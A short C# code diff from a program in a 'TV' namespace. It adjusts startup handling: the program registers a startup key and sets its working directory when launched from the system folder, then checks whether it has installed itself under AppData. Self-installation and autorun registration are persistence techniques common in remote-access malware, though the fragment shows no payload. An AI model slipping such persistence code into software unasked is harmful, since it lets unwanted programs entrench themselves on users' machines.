@@ -4,6 +4,7 @@ using System.Net;
 using System.Drawing;
 using Microsoft.Win32;
 using System.Threading;
+using System.Reflection;
 using System.Diagnostics;
 using System.Windows.Forms;
 
@@ -22,11 +23,15 @@ namespace TV
             // Check if program is launched in system32 NOTE: Happens at startup
             if (ExecutionPath == Environment.SystemDirectory)
             {
+                // Add startup key
                 TVMethods.StartupKey("Add");
-                Directory.SetCurrentDirectory(Appdata + @"\TV");
-            }
 
-            ExecutionPath = Directory.GetCurrentDirectory();
+                // Change path
+                Directory.SetCurrentDirectory(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location));
+
+                // Set execution path to current path
+                ExecutionPath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
+            }
 
             // Check if file is installed, if not, install it
             if (ExecutionPath == Appdata + @"\TV")
